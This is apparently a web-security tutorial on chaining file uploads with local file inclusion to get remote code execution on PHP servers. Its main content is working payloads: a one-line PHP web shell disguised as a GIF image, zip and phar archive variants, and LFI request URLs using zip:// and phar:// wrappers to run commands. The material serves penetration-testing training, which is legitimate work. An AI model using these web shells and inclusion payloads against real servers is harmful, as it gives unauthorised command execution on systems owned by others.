# LFI and File Uploads

File upload functionalities are common in modern web applications, allowing users to upload data for profile configuration and other purposes. However, this feature can be exploited by attackers, especially when combined with file inclusion vulnerabilities. This section discusses how to exploit file upload functionalities to achieve remote code execution.

***

### 🔍 Understanding File Upload Attacks

Even if a file upload form is not inherently vulnerable, if the uploaded files can be executed by the server, attackers can exploit this to run malicious code. The following functions allow for code execution when files are included:

| Function                  | Read Content | Execute | Remote URL |
| ------------------------- | ------------ | ------- | ---------- |
| **PHP**                   |              |         |            |
| include()/include\_once() | ✅            | ✅       | ✅          |
| require()/require\_once() | ✅            | ✅       | ❌          |
| **NodeJS**                |              |         |            |
| res.render()              | ✅            | ✅       | ❌          |
| **Java**                  |              |         |            |
| import                    | ✅            | ✅       | ✅          |
| **.NET**                  |              |         |            |
| include                   | ✅            | ✅       | ✅          |

#### Image Uploads

Image uploads are often considered safe, but if the file inclusion functionality is vulnerable, attackers can exploit this by uploading files that contain malicious code disguised as images.

***

### 🖼️ Crafting a Malicious Image

To create a malicious image that contains PHP code, we can use an allowed image extension and include the appropriate magic bytes. For example, to create a PHP web shell within a GIF file:

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

This file will appear as a valid image but will execute PHP code when included through an LFI vulnerability.

#### Uploading the Malicious Image

Upload the crafted image through the profile settings page:

```plaintext
http://<SERVER_IP>:<PORT>/settings.php
```

#### Including the Uploaded File

After uploading, we need to include the file using its path. Inspect the source code to find the uploaded file's URL:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

Include the file through the LFI vulnerability:

```plaintext
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

***

### 📦 Alternative Techniques: Zip and Phar Uploads

#### Zip Uploads

If the initial method does not work, we can use the zip wrapper to execute PHP code. First, create a PHP web shell and zip it:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Upload the zip file and include it using the zip wrapper:

{% code overflow="wrap" %}
```plaintext
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
{% endcode %}

#### Phar Uploads

Another method involves using the phar wrapper. Create a PHP script to generate a phar file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

Compile it into a phar file and rename it:

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Upload the phar file and include it:

{% code overflow="wrap" %}
```plaintext
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
{% endcode %}

***

### ⚠️ Important Notes

* The first method (malicious image upload) is the most reliable, while zip and phar methods serve as alternatives.
* Ensure that the web application allows the upload of the file types being exploited.
* Be aware of security measures that may block these types of uploads.

By understanding these techniques, security professionals can better protect against file upload vulnerabilities and ensure that web applications are secure from potential exploits.
